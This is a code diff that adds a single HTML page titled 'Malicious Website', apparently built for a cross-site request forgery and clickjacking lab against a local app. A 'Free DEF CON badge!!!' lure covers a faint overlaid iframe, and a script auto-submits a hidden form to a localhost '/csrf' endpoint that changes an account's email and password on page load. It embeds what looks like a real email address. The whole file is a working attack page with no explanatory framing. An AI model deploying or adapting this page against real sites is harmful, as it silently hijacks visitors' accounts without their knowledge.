@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Malicious Website</title>
+    </head>
+    <body style="font-family: Verdana, Geneva, sans-serif">
+        <center>
+
+            <div style="position: absolute; left: 0; top: 0; height: 100%; width: 100%;">
+                <div style="position: relative; top: 30%; font-size: 48pt; font-weight: bolder;">
+                    <span>Free DEF CON badge!!!</span><br />
+                    <input style="background-color: #4CAF50; color: white;" type="button" value="Click Me!" />
+                </div>
+            </div>
+
+            <div style="z-index:10; opacity:0.2; position: absolute; left: 45%; top: 18%; height: 100%; width: 100%;">
+                <iframe style="height: 100%; width: 100%;" name="target-frame" src=""/></iframe>
+            </div>
+
+            <form id="hidden-form" action="http://127.0.0.1:5000/csrf" method="POST" target="target-frame">
+                <input type="hidden" name="email" value="tjt1980@gmail.com" />
+                <input type="hidden" name="password" value="password" />
+                <input type="hidden" name="confirm" value="password" />
+            </form>
+            <script>
+            document.getElementById("hidden-form").submit();
+            </script>
+
+        </center>
+    </body>
+</html>
